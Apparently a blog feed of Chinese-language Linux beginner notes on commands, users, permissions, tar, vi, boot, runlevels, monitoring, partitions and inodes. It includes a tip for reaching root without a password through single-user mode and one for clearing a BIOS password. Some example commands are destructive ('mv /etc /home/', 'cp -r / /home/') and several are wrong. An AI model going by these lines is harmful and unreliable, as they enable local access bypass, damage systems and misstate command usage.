        <content type="html"><![CDATA[<h3 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h3><p>命令       选项       参数<br>command  -options   parameter</p><h3 id="显示文件"><a href="#显示文件" class="headerlink" title="显示文件"></a>显示文件</h3><table><thead><tr><th align="left">命令</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">ls</td><td align="left">显示文件</td></tr><tr><td align="left">ls -a</td><td align="left">显示隐藏文件</td></tr><tr><td align="left">ls -l</td><td align="left">显示文件列表</td></tr><tr><td align="left">ls -l -h</td><td align="left">显示文件大小</td></tr><tr><td align="left">tree</td><td align="left">显示树形文件</td></tr></tbody></table><h3 id="命令帮助"><a href="#命令帮助" class="headerlink" title="命令帮助"></a>命令帮助</h3><p>命令+空格+–help</p><p>如：<br>ls –help<br>man ls<br>    按键F往下翻页<br>    按键B往上翻页</p><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><p>history<br>查看输入的历史命令。</p><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>ls &gt; test.txt</p><p>把命令显示的内容定向到test.txt文件。</p><blockquote><p> 直接覆盖内容</p><blockquote><p>在行末追加内容</p></blockquote></blockquote><h3 id="分页显示"><a href="#分页显示" class="headerlink" title="分页显示"></a>分页显示</h3><p>more test.txt<br>      按键F往下翻页<br>      按键B往上翻页</p><p>如：<br>ls -alh | more<br>显示文件，并加入管道，让more执行。</p><h3 id="多命令执行"><a href="#多命令执行" class="headerlink" title="多命令执行"></a>多命令执行</h3><p>要一行执行多条命令，需要加分好隔开。<br>如：<br>ls;ls -alh</p><h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><p>mkdir test<br>创建test文件夹</p><p>mkdir -p test/test/test<br>创建依赖的文件夹</p><p>touch test<br>创建test文件</p><h3 id="删除文件夹"><a href="#删除文件夹" class="headerlink" title="删除文件夹"></a>删除文件夹</h3><p>rmdir test<br>删除文件夹test</p><p>rm -rf test<br>强制删除非空文件</p><p>=========================================================</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux 基础知识</title>
      <link href="/article/linux-first.html"/>
      <url>/article/linux-first.html</url>
      
        <content type="html"><![CDATA[<h3 id="终端切换"><a href="#终端切换" class="headerlink" title="终端切换"></a>终端切换</h3><p>切换虚拟终端的方法：Ctrl+Alt+F[1～6]，如想切换到第二号虚拟终端，则同时按Ctrl+Alt+F2<br>普通用户登录后系统的提示符：$<br>root用户登录后系统的提示符：#</p><h3 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h3><p>命令 【选项】 【参数】</p><ul><li>掌握命令格式中命令、选项、参数的具体含义</li><li>命令：告诉Linux（UNIX）操作系统做（执行）什么。</li><li>选项：说明命令运行的方式（可以改变命令的功能）。选项部分是以“-”字符开始的。</li><li>参数：说明命令影响（操作）的是什么（如一个文件、一个目录或是一段正文文字）</li></ul><table><thead><tr><th align="left">命令</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">init 0</td><td align="left">关机</td></tr><tr><td align="left">power off</td><td align="left">关机</td></tr><tr><td align="left">reboot</td><td align="left">重启</td></tr><tr><td align="left">ls -l</td><td align="left">更详细的查看当前目录下的文件</td></tr><tr><td align="left">ls -a</td><td align="left">显示隐藏文件</td></tr><tr><td align="left">ls -l /boot</td><td align="left">查看系统目录下的文件</td></tr><tr><td align="left">whoami</td><td align="left">查看目前登录的用户</td></tr><tr><td align="left">who</td><td align="left">列出目前哪些用户在系统上工作</td></tr><tr><td align="left">date</td><td align="left">查看系统时间</td></tr><tr><td align="left">date 030914522018</td><td align="left">设置时间：2018-3-11 14:52</td></tr><tr><td align="left">cal</td><td align="left">查看日历</td></tr><tr><td align="left">cal 7 2018</td><td align="left">查看2018年7月份日历</td></tr><tr><td align="left">clear</td><td align="left">清屏</td></tr><tr><td align="left">hwclock –s</td><td align="left">同步硬件时间</td></tr><tr><td align="left">hwclock –w</td><td align="left">同步系统时间</td></tr><tr><td align="left">useradd webing</td><td align="left">新建webing用户</td></tr><tr><td align="left">useradel -r webing</td><td align="left">删除webing用户</td></tr><tr><td align="left">groupadd webing</td><td align="left">新建webing组</td></tr><tr><td align="left">groupdel webing</td><td align="left">删除webing组</td></tr><tr><td align="left">passwd webing</td><td align="left">修改webing用户密码</td></tr><tr><td align="left">su - webing</td><td align="left">切换到webing用户</td></tr><tr><td align="left">man su</td><td align="left">查看su使用说明</td></tr><tr><td align="left">su –help</td><td align="left">查看su命令使用帮助</td></tr><tr><td align="left">pwd</td><td align="left">显示当前目录</td></tr><tr><td align="left">cd ..</td><td align="left">返回上级目录</td></tr><tr><td align="left">cd -</td><td align="left">返回上次所在目录</td></tr><tr><td align="left">cd</td><td align="left">返回家目录</td></tr><tr><td align="left">cp -r / /home/</td><td align="left">递归复制根目录下所有文件到home目录</td></tr><tr><td align="left">mv /etc /home/</td><td align="left">移动etc目录下所有文件到home目录</td></tr><tr><td align="left">mv 1.txt 2.txt</td><td align="left">改名</td></tr><tr><td align="left">mkdir -p /1/2</td><td align="left">递归创建目录</td></tr><tr><td align="left">touch 1.txt</td><td align="left">创建文件</td></tr><tr><td align="left">head -1 1.txt</td><td align="left">查看文件第一行，默认10行</td></tr><tr><td align="left">tail -1 1.txt</td><td align="left">查看文件倒数第一行，默认10行</td></tr><tr><td align="left">tail -f 1.txt</td><td align="left">动态查看文件增加减少</td></tr><tr><td align="left">alias cp</td><td align="left">查看cp命令别名</td></tr><tr><td align="left">alias webing=’ls’</td><td align="left">创建webing命令别名</td></tr><tr><td align="left">unalias webing</td><td align="left">删除webing命令别名</td></tr><tr><td align="left">id root</td><td align="left">查看用户ID</td></tr><tr><td align="left">wc -l /etc/passwd</td><td align="left">统计文件有多少行</td></tr></tbody></table><h3 id="文件目录"><a href="#文件目录" class="headerlink" title="文件目录"></a>文件目录</h3><table><thead><tr><th align="left">目录名</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">bin</td><td align="left">用来存放常用的可执行文件</td></tr><tr><td align="left">sbin</td><td align="left">用来存放系统的可执行文件</td></tr><tr><td align="left">boot</td><td align="left">开机与内核文件</td></tr><tr><td align="left">dev</td><td align="left">设备文件目录</td></tr><tr><td align="left">etc</td><td align="left">配置文件目录</td></tr><tr><td align="left">home</td><td align="left">用来存放用户自己的文件或目录</td></tr><tr><td align="left">init</td><td align="left"></td></tr><tr><td align="left">lib</td><td align="left">系统使用的函数库的目录</td></tr><tr><td align="left">lib64</td><td align="left">系统使用的函数库的目录</td></tr><tr><td align="left">media</td><td align="left">挂载目录，通常可移除式硬件会被挂载在该目录下</td></tr><tr><td align="left">mnt</td><td align="left">挂载目录</td></tr><tr><td align="left">opt</td><td align="left">第三方软件安装目录</td></tr><tr><td align="left">proc</td><td align="left">进程信息及内核信息（cpu内存）存放在这里</td></tr><tr><td align="left">root</td><td align="left">系统管理员root的家目录</td></tr><tr><td align="left">run</td><td align="left"></td></tr><tr><td align="left">snap</td><td align="left"></td></tr><tr><td align="left">srv</td><td align="left">网络服务启动后，服务所需要取用的数据目录</td></tr><tr><td align="left">sys</td><td align="left">一个虚拟的档案系统，主要记录与核心相关的资讯</td></tr><tr><td align="left">tmp</td><td align="left">临时文件目录</td></tr><tr><td align="left">usr</td><td align="left">应用程序存放目录</td></tr><tr><td align="left">var</td><td align="left">系统执行过程中经常变化的文件</td></tr></tbody></table><h3 id="用户、群组、权限"><a href="#用户、群组、权限" class="headerlink" title="用户、群组、权限"></a>用户、群组、权限</h3><p>useradd -u 555 -g root -d /home/web -c rootweb -s /bin/bash web<br>创建用户 指定uid 用户组 家目录 描述信息 登录系统 用户名</p><p><strong>cat /etc/passwd</strong><br><strong>root:x:0:0:root:/root:/bin/bash</strong></p><table><thead><tr><th align="left">root</th><th align="left">x</th><th align="left">0</th><th align="left">0</th><th align="left">root</th><th align="left">/root</th><th align="left">/bin/bash</th></tr></thead><tbody><tr><td align="left">用户名</td><td align="left">密码占位符</td><td align="left">user id，0代表root</td><td align="left">group id</td><td align="left">用户描述信息</td><td align="left">家目录</td><td align="left">允许登录操作系统的可执行文件</td></tr></tbody></table><p><strong>cat /etc/group</strong><br><strong>root:x:0:</strong></p><table><thead><tr><th align="left">root</th><th align="left">x</th><th align="left">0</th><th align="left"></th></tr></thead><tbody><tr><td align="left">组名</td><td align="left">组密码占位符</td><td align="left">组ID</td><td align="left">组内用户列表</td></tr></tbody></table><p>usermod命令的常用选项：<br>–u：修改用户的UID<br>–g：修改用户的GID<br>–G：将一个用户加入到指定的群组中<br>–d：修改用户的家目录<br>–c：修改用户的备注信息<br>–s：修改用户所用的shell</p><p>usermod命令的举例：<br>修改babydog4用户的家目录为/home/babies的命令：</p><p>usermod –d /home/babies babydog4</p><p>将babydog4这个用户添加到babydog6这个群组中的命令：</p><p>usermod –G babydog6 babydog4</p><p>将babydog4这个用户的的gid变更为dog群组的命令：</p><p>usermod –g dog babydog4</p><p>修改文件的组：<br>chown root group /etc/passwd</p><h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3><p><strong>ls -l</strong><br><strong>drwxrwxrwx 0 root root 512 Mar 11 18:14 test</strong></p><table><thead><tr><th align="left">drwxrwxrwx</th><th align="left">0</th><th align="left">root</th><th align="left">root</th><th align="left">512</th><th align="left">Mar 11 18:14</th><th align="left">test</th></tr></thead><tbody><tr><td align="left">权限信息共10位</td><td align="left">硬链接数</td><td align="left">属主</td><td align="left">属组</td><td align="left">文件大小</td><td align="left">文件创建信息</td><td align="left">文件名</td></tr></tbody></table><p>=====================================================</p><table><thead><tr><th align="left">drwxrwxrwx</th><th align="left">r 读 4</th><th align="left">w 写 2</th><th align="left">x 执行 1</th></tr></thead><tbody><tr><td align="left">d</td><td align="left">rwx</td><td align="left">rwx</td><td align="left">rwx</td></tr><tr><td align="left">文件类型,-普通文件 d目录 l软连接 b设备文件 P管道文件</td><td align="left">属主权限 u</td><td align="left">属组权限 g</td><td align="left">其他用户 o</td></tr><tr><td align="left">chmod u -rw test</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">chmod g -rw test</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">chmod o -rw test</td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table><h3 id="压缩解压缩"><a href="#压缩解压缩" class="headerlink" title="压缩解压缩"></a>压缩解压缩</h3><p>tar</p><p>-c: 建立压缩档案<br>-x：解压<br>-t：查看内容<br>-r：向压缩归档文件末尾追加文件<br>-u：更新原压缩包中的文件</p><p>这五个是独立的命令，压缩解压都要用到其中一个，可以和别的命令连用但只能用其中一个。下面的参数是根据需要在压缩或解压档案时可选的。</p><p>-z：有gzip属性的<br>-j：有bz2属性的<br>-Z：有compress属性的<br>-v：显示所有过程<br>-O：将文件解开到标准输出</p><p>下面的参数-f是必须的</p><p>-f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。</p><p>tar -cf all.tar *.jpg<br>这条命令是将所有.jpg的文件打成一个名为all.tar的包。-c是表示产生新的包，-f指定包的文件名。</p><p>tar -rf all.tar *.gif<br>这条命令是将所有.gif的文件增加到all.tar的包里面去。-r是表示增加文件的意思。</p><p>tar -uf all.tar logo.gif<br>这条命令是更新原来tar包all.tar中logo.gif文件，-u是表示更新文件的意思。</p><p>tar -tf all.tar<br>这条命令是列出all.tar包中所有文件，-t是列出文件的意思</p><p>tar -xf all.tar<br>这条命令是解出all.tar包中所有文件，-t是解开的意思</p><p>压缩</p><p>tar -cvf jpg.tar *.jpg //将目录里所有jpg文件打包成tar.jpg </p><p>tar -czf jpg.tar.gz *.jpg   //将目录里所有jpg文件打包成jpg.tar后，并且将其用gzip压缩，生成一个gzip压缩过的包，命名为jpg.tar.gz</p><p>tar -cjf jpg.tar.bz2 *.jpg //将目录里所有jpg文件打包成jpg.tar后，并且将其用bzip2压缩，生成一个bzip2压缩过的包，命名为jpg.tar.bz2</p><p>tar -cZf jpg.tar.Z *.jpg   //将目录里所有jpg文件打包成jpg.tar后，并且将其用compress压缩，生成一个umcompress压缩过的包，命名为jpg.tar.Z</p><p>rar a jpg.rar *.jpg //rar格式的压缩，需要先下载rar for linux</p><p>zip jpg.zip *.jpg //zip格式的压缩，需要先下载zip for linux</p><p>解压</p><p>tar -xvf file.tar //解压 tar包</p><p>tar -xzvf file.tar.gz //解压tar.gz</p><p>tar -xjvf file.tar.bz2   //解压 tar.bz2</p><p>tar -xZvf file.tar.Z   //解压tar.Z</p><p>unrar e file.rar //解压rar</p><p>unzip file.zip //解压zip</p><p>总结</p><p>1、*.tar 用 tar -xvf 解压</p><p>2、*.gz 用 gzip -d或者gunzip 解压</p><p>3、*.tar.gz和*.tgz 用 tar -xzf 解压</p><p>4、*.bz2 用 bzip2 -d或者用bunzip2 解压</p><p>5、*.tar.bz2用tar -xjf 解压</p><p>6、*.Z 用 uncompress 解压</p><p>7、*.tar.Z 用tar -xZf 解压</p><p>8、*.rar 用 unrar e解压</p><p>9、*.zip 用 unzip 解压</p><h3 id="备份系统"><a href="#备份系统" class="headerlink" title="备份系统"></a>备份系统</h3><p>tar -cvpzf /media/disk/backup.tgz / –exclude=/proc</p><p>恢复备份：<br>tar -xvpzf backup.tgz -C /</p><h3 id="VI编辑器"><a href="#VI编辑器" class="headerlink" title="VI编辑器"></a>VI编辑器</h3><table><thead><tr><th align="center">命令</th><th align="left">含义</th></tr></thead><tbody><tr><td align="center">a</td><td align="left">进入插入模式并在光标之后进行添加</td></tr><tr><td align="center">i</td><td align="left">进入插入模式并在光标之前进行插入</td></tr><tr><td align="center">o</td><td align="left">进入插入模式并在当前（光标所在）行之下开启新的一行</td></tr><tr><td align="center">dd</td><td align="left">删除光标所在行</td></tr><tr><td align="center">ndd</td><td align="left">n为数字，删除光标所在的向下n行</td></tr><tr><td align="center">yy</td><td align="left">复制光标所在行</td></tr><tr><td align="center">nyy</td><td align="left">n为数字，复制光标所在的向下n行</td></tr><tr><td align="center">p</td><td align="left">将已复制的数据在光标下一行粘贴</td></tr><tr><td align="center">P</td><td align="left">将已复制的数据在光标上一行粘贴</td></tr><tr><td align="center">u</td><td align="left">撤销上一步操作</td></tr><tr><td align="center">ctrl+r</td><td align="left">还原上一步操作</td></tr><tr><td align="center">$</td><td align="left">跳到行尾</td></tr><tr><td align="center">0</td><td align="left">跳到首部</td></tr><tr><td align="center">ctrl+a</td><td align="left">命令模式下跳到首部</td></tr><tr><td align="center">ctrl+e</td><td align="left">命令模式下跳到行尾</td></tr><tr><td align="center">gg</td><td align="left">跳到首行</td></tr><tr><td align="center">G</td><td align="left">跳到尾行</td></tr><tr><td align="center">nG</td><td align="left">n为数字，跳到指定行</td></tr><tr><td align="center">set nu</td><td align="left">显示行数</td></tr></tbody></table><h3 id="启动流程"><a href="#启动流程" class="headerlink" title="启动流程"></a>启动流程</h3><p><strong><em>Linux系统引导的顺序：</em></strong></p><p>BIOS —&gt; MBR —&gt; boot loader —&gt; Kernel —&gt; init process —&gt; login</p><p>BIOS的工作是检查计算机的硬件设备，如CPU、内存和风扇速度等.<br>BIOS（Basic Input/Output System）（基本输入/输出系统的缩写），它是硬件与软件之间的接口，而且是非常基本的接口。</p><p>MBR会在启动盘的第1个块中，大小为512B。其中前446中的程序代码是用来选择boot partition（分区），也就是由哪个分区来装入开机用的代码。</p><p>GRUB的定义：GRUB是Grand Unified Bootloader（多重操作系统启动管理器）的缩写。</p><p><strong><em>启动流程：</em></strong><br>当我们打开计算机电源，计算机会自动从主板的BIOS(Basic Input/Output System)读取其中所存储的程序。这一程序通常知道一些直接连接在主板上的硬件(硬盘，网络接口，键盘，串口，并口)。现在大部分的BIOS允许你从软盘、光盘或者硬盘中选择一个来启动计算机。<br>下一步，计算机将从你所选择的存储设备中读取起始的512 bytes(比如光盘一开是的512 bytes，如果我们从光盘启动的话)。这512 bytes叫做主引导记录MBR (master boot record)。MBR会告诉电脑从该设备的某一个分区(partition)来装载引导加载程序(boot loader)。Boot loader储存有操作系统(OS)的相关信息，比如操作系统名称，操作系统内核 (kernel)所在位置等。常用的boot loader有GRUB和LILO。<br>随后，boot loader会帮助我们加载kernel。kernel实际上是一个用来操作计算机的程序，它是计算机操作系统的内核，主要的任务是管理计算机的硬件资源，充当软件和硬件的接口。操作系统上的任何操作都要通过kernel传达给硬件。Windows和Linux各自有自己kernel。狭义的操作系统就是指kernel，广义的操作系统包括kernel以及kernel之上的各种应用。</p><p>446 bytes 引导信息<br>64 bytes  分区信息<br>2 bytes   接触的标志位</p><p>我们可以在多个分区安装boot loader，每个boot loader对应不同的操作系统，在读取MBR的时候选择我们想要启动的boot loader。这就是多操作系统的原理。根据boot loader的选项，Linux此时可以进入单用户模式(single user mode)。在此模式下，初始脚本还没有开始执行，我们可以检测并修复计算机可能存在的错误。</p><p>如果我们加载的是Linux kernel，Linux kernel开始工作。kernel会首先预留自己运行所需的内存空间，然后通过驱动程序(driver)检测计算机硬件。这样，操作系统就可以知道自己有哪些硬件可用。随后，kernel会启动一个init进程。它是Linux系统中的1号进程(Linux系统没有0号进程)。到此，kernel就完成了在计算机启动阶段的工作，交接给init来管理。</p><p>随后，init会运行一系列的初始脚本(startup scripts)，这些脚本是Linux中常见的shell scripts。这些脚本执行如下功能：<br>设置计算机名称，时区，检测文件系统，挂载硬盘，清空临时文件，设置网络……<br>当这些初始脚本，操作系统已经完全准备好了，只是，还没有人可以登录！！！init会给出登录(login)对话框，或者是图形化的登录界面。</p><h3 id="关闭重启系统"><a href="#关闭重启系统" class="headerlink" title="关闭重启系统"></a>关闭重启系统</h3><p>常用的可以关闭系统的命令：<br>shutdown -h now<br>halt<br>poweroff<br>init 0</p><p>常用的可以重启系统的命令：<br>shutdown -r now<br>reboot<br>init 6</p><p>Linux一共有七个启动级别，切换级别 init 0-7 。<br>cat /etc/inittab<br>0 - halt                    关机<br>1 - Single user mode        单用户，登录后为root权限，无需输入密码。启动系统，在读秒时按任意键。按键：E-&gt; 2 -&gt; E -&gt; 空格 -&gt; 1<br>2 - Multiuser without NFS   多用户，没有网络跟3一样<br>3 - Full multiuse mode      命令行模式<br>4 - unused                  没有使用级别，用于开发<br>5 - x11                     图形界面<br>6 - reboot                  重启</p><p>id:5:initdefault            默认5</p><h3 id="系统监控"><a href="#系统监控" class="headerlink" title="系统监控"></a>系统监控</h3><p>系统监视和进程控制工具 top and free</p><p>top命令的功能：top命令是Linux下常用的性能分析工具,能够实时显示系统中各个进程的资源占用状况,类似于Windows的任务管理器。<br>列出系统状态时，系统默认每5秒刷新一下屏幕上的显示结果。</p><p>第一行信息：<br>top - 11:29:29 up 1 min,  0 users,  load average: 0.52, 0.58, 0.59</p><table><thead><tr><th align="center">top</th><th align="left">11:29:29</th><th align="left">up 1 min</th><th align="left">0 users</th><th align="left">load average: 0.52, 0.58, 0.59</th></tr></thead><tbody><tr><td align="center"></td><td align="left">当前时间</td><td align="left">系统运行时间，格式为时:分</td><td align="left">当前登录用户数</td><td align="left">系统负载。 三个数值分别为  1分钟、5分钟、15分钟前到现在的平均值。</td></tr></tbody></table><p>第二行进程信息：</p><p>Tasks:   3 total,   1 running,   2 sleeping,   0 stopped,   0 zombie</p><table><thead><tr><th align="center">Tasks:   3 total</th><th align="center">1 running</th><th align="center">2 sleeping</th><th align="center">0 stopped</th><th align="center">0 zombie</th></tr></thead><tbody><tr><td align="center">进程总数</td><td align="center">正在运行的进程数</td><td align="center">睡眠的进程数</td><td align="center">停止的进程数</td><td align="center">僵尸进程数</td></tr></tbody></table><p>进程：动态的代码文件<br>僵尸进程：主进程已经关闭，子进程还在运行，并且不作任何工作。</p><p>第三行CPU信息：<br>%Cpu(s):  1.2 us,  0.7 sy,  0.0 ni, 98.1 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</p><table><thead><tr><th align="center">%Cpu(s):  1.2 us</th><th align="center">0.7 sy</th><th align="center">0.0 ni</th><th align="center">98.1 id</th><th align="center">0.0 wa</th><th align="center">0.0 hi</th><th align="center">0.0 si</th><th align="center">0.0 st</th></tr></thead><tbody><tr><td align="center">用户空间占用CPU百分比</td><td align="center">内核空间占用CPU百分比</td><td align="center">用户进程空间内改变过优先级的进程占用CPU百分比</td><td align="center">空闲CPU百分比</td><td align="center">等待输入输出的CPU时间百分比</td><td align="center">硬件中断占用CPU时间的百分比</td><td align="center">软件中断占用CPU时间的百分比</td><td align="center">Steal Time</td></tr></tbody></table><p>第四行内存信息：<br>KiB Mem :  7812596 total,  4376356 free,  3199764 used,   236476 buff/cache</p><p>| KiB Mem | 7812596 total | 4376356 free | 3199764 used | 236476 buff/cache |<br>|:—–:||:—–:||:—–:||:—–:||:—–:|<br>| 内存 | 物理内存总量 | 已使用的物理内存 | 空闲物理内存 | 内核缓存内存量 |</p><p>第五行交换分区信息：<br>KiB Swap:  6553468 total,  6482220 free,    71248 used.  4469656 avail Mem</p><p>| KiB Swap | 6553468 total | 6482220 free | 71248 used | 4469656 avail Mem |<br>|:—–:||:—–:||:—–:||:—–:||:—–:|<br>| 交换分区 | 交换区总量 | 已使用交互区总量 | 空闲交换区总量 | 缓冲的交换区总量 |</p><p>缓冲区：buffer当数据从硬盘读取到内存，先写入到缓冲区，占到一定的程度，内存就会调用，缓解硬盘与内存的时间差问题。</p><p>高速缓存：cache缓解CPU与内存之间的速度差，存放CPU经常调用的数据。</p><p>第六行信息：</p><p>PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND</p><table><thead><tr><th align="center">PID</th><th align="center">USER</th><th align="center">PR</th><th align="center">NI</th><th align="center">VIRT</th><th align="center">RES</th><th align="center">SHR</th><th align="center">S</th><th align="center">%CPU</th><th align="center">%MEM</th><th align="center">TIME+</th><th align="center">TIME+</th></tr></thead><tbody><tr><td align="center">进程ID</td><td align="center">进程所有者</td><td align="center">优先级</td><td align="center">nice值，负值表示高优先级</td><td align="center">进程使用的虚拟内存总量</td><td align="center">进程使用的、未被换出的物理内存大小</td><td align="center">共享内存大小</td><td align="center">进程状态</td><td align="center">上次更新到现在的CPU时间占用百分比</td><td align="center">进程使用的物理内存百分比</td><td align="center">进程使用CPU总时间</td><td align="center">命令名、命令行</td></tr></tbody></table><p>free -m<br>free -h<br>查看内存空间</p><p>total  used  free  shared  buff/cache  available</p><table><thead><tr><th align="center">total</th><th align="center">used</th><th align="center">free</th><th align="center">shared</th><th align="center">buff/cache</th><th align="center">available</th></tr></thead><tbody><tr><td align="center">总内存</td><td align="center">分配出去的缓冲区内存</td><td align="center">剩余内存</td><td align="center">共享内存</td><td align="center">缓冲区内存</td><td align="center"></td></tr></tbody></table><p>====================================</p><h3 id="GRUP加密"><a href="#GRUP加密" class="headerlink" title="GRUP加密"></a>GRUP加密</h3><p>防止进入单用户更改密码。</p><p>加密：grub-md5-crypt<br>编辑grub配置文件，在title上边添加：password –md5 刚才生成的密文,或者password=明文</p><h3 id="BIOS加密"><a href="#BIOS加密" class="headerlink" title="BIOS加密"></a>BIOS加密</h3><p>进入BIOS就可以加密啦…..扣掉主板上的电池就可以清除BIOS密码啦~</p><h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><p>ps:process search<br>ps aux<br>ps aux | head -1   查看第一行<br>查看可以登录系统的用户：<br>grep ‘/bin/bash’ /etc/passwd</p><p>查看带有init的进程信息：<br>ps aux | grep ‘init’<br>ps aux | grep ‘init’ | grep -v ‘grep’</p><p>kill<br>kill -9 pid 强制杀死<br>firefox &amp; 后台运行<br>jobs 查看着在后台运行的程序<br>fg %1 调到前台运行<br>kill -9 %1<br>pstree 查看进程树</p><h3 id="硬盘分区"><a href="#硬盘分区" class="headerlink" title="硬盘分区"></a>硬盘分区</h3><p>硬盘在/dev/目录下<br>块存储：相当于一块大的硬盘<br>文件存储：相当于一个文件夹</p><p>fdisk -l /dev/sdb 查看硬盘信息<br>fdisk /dev/sdb  分区 最多4个主分区<br>m 查看帮助<br>n 新建分区<br>p 主分区<br>d 删除分区<br>e 新建扩展分区<br>w 保存<br>partprobe 更新</p><p>格式化 扩展分区不能格式化<br>mkfs ext4 /dev/sdb1<br>mount /dev/sdb1 /sdb/   挂载分区</p><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>统计目录大小：<br>du -sh /etc/</p><p>inode编号：<br>ls -i /etc/passwd</p><p>df -i ：查看硬盘inode信息</p><p>测试硬盘速度：<br>dd if=/dev/sda1 of=/opt/test bs=10G count=1</p><p>新建多个文件:<br>touch /mnt/e/test/{1..10000}.txt</p><p>一、inode是什么？</p><p>理解inode，要从文件储存说起。<br>文件储存在硬盘上，硬盘的最小存储单位叫做”扇区”（Sector）。每个扇区储存512字节（相当于0.5KB）。</p><p>操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个”块”（block）。这种由多个扇区组成的”块”，是文件存取的最小单位。”块”的大小，最常见的是4KB，即连续八个 sector组成一个 block。</p><p>文件数据都储存在”块”中，那么很显然，我们还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode，中文译名为”索引节点”。</p><p>二、inode的内容<br>inode包含文件的元信息，具体来说有以下内容：<br>　　* 文件的字节数<br>　　* 文件拥有者的User ID<br>　　* 文件的Group ID<br>　　* 文件的读、写、执行权限<br>　　* 文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。<br>　　* 链接数，即有多少文件名指向这个inode<br>　　* 文件数据block的位置</p><p>可以用stat命令，查看某个文件的inode信息：<br>stat example.txt</p><p>总之，除了文件名以外的所有文件信息，都存在inode之中。至于为什么没有文件名，下文会有详细解释。</p><p>三、inode的大小<br>inode也会消耗硬盘空间，所以硬盘格式化的时候，操作系统自动将硬盘分成两个区域。一个是数据区，存放文件数据；另一个是inode区（inode table），存放inode所包含的信息。<br>每个inode节点的大小，一般是128字节或256字节。inode节点的总数，在格式化时就给定，一般是每1KB或每2KB就设置一个inode。假定在一块1GB的硬盘中，每个inode节点的大小为128字节，每1KB就设置一个inode，那么inode table的大小就会达到128MB，占整块硬盘的12.8%。</p><p>查看每个硬盘分区的inode总数和已经使用的数量，可以使用df命令。<br>df -i</p><p>查看每个inode节点的大小，可以用如下命令：<br>sudo dumpe2fs -h /dev/hda | grep “Inode size”</p><p>由于每个文件都必须有一个inode，因此有可能发生inode已经用光，但是硬盘还未存满的情况。这时，就无法在硬盘上创建新文件。</p><p>四、inode号码<br>每个inode都有一个号码，操作系统用inode号码来识别不同的文件。</p><p>这里值得重复一遍，Unix/Linux系统内部不使用文件名，而使用inode号码来识别文件。对于系统来说，文件名只是inode号码便于识别的别称或者绰号。表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：首先，系统找到这个文件名对应的inode号码；其次，通过inode号码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。</p><p>使用ls -i命令，可以看到文件名对应的inode号码：</p><p>ls -i example.txt</p><p>五、目录文件<br>Unix/Linux系统中，目录（directory）也是一种文件。打开目录，实际上就是打开目录文件。</p><p>目录文件的结构非常简单，就是一系列目录项（dirent）的列表。每个目录项，由两部分组成：所包含文件的文件名，以及该文件名对应的inode号码。</p><p>ls命令只列出目录文件中的所有文件名：<br>ls /etc</p><p>ls -i命令列出整个目录文件，即文件名和inode号码：<br>ls -i /etc</p><p>如果要查看文件的详细信息，就必须根据inode号码，访问inode节点，读取信息。ls -l命令列出文件的详细信息。<br>ls -l /etc</p><p>六、硬链接<br>一般情况下，文件名和inode号码是”一一对应”关系，每个inode号码对应一个文件名。但是，Unix/Linux系统允许，多个文件名指向同一个inode号码。这意味着，可以用不同的文件名访问同样的内容；对文件内容进行修改，会影响到所有文件名；但是，删除一个文件名，不影响另一个文件名的访问。这种情况就被称为”硬链接”（hard link）。</p><p>ln命令可以创建硬链接：</p><p>ln 源文件 目标文件</p><p>运行上面这条命令以后，源文件与目标文件的inode号码相同，都指向同一个inode。inode信息中有一项叫做”链接数”，记录指向该inode的文件名总数，这时就会增加1。反过来，删除一个文件名，就会使得inode节点中的”链接数”减1。当这个值减到0，表明没有文件名指向这个inode，系统就会回收这个inode号码，以及其所对应block区域。</p><p>这里顺便说一下目录文件的”链接数”。创建目录时，默认会生成两个目录项：”.”和”..”。前者的inode号码就是当前目录的inode号码，等同于当前目录的”硬链接”；后者的inode号码就是当前目录的父目录的inode号码，等同于父目录的”硬链接”。所以，任何一个目录的”硬链接”总数，总是等于2加上它的子目录总数（含隐藏目录）,这里的2是父目录对其的“硬链接”和当前目录下的”.硬链接“。</p><p>七、软链接<br>除了硬链接以外，还有一种特殊情况。文件A和文件B的inode号码虽然不一样，但是文件A的内容是文件B的路径。读取文件A时，系统会自动将访问者导向文件B。因此，无论打开哪一个文件，最终读取的都是文件B。这时，文件A就称为文件B的”软链接”（soft link）或者”符号链接（symbolic link）。</p><p>这意味着，文件A依赖于文件B而存在，如果删除了文件B，打开文件A就会报错：”No such file or directory”。这是软链接与硬链接最大的不同：文件A指向文件B的文件名，而不是文件B的inode号码，文件B的inode”链接数”不会因此发生变化。</p><p>ln -s命令可以创建软链接。<br>ln -s 源文文件或目录 目标文件或目录</p><p>八、inode的特殊作用<br>由于inode号码与文件名分离，这种机制导致了一些Unix/Linux系统特有的现象。<br>　　1. 有时，文件名包含特殊字符，无法正常删除。这时，直接删除inode节点，就能起到删除文件的作用。<br>　　2. 移动文件或重命名文件，只是改变文件名，不影响inode号码。<br>　　3. 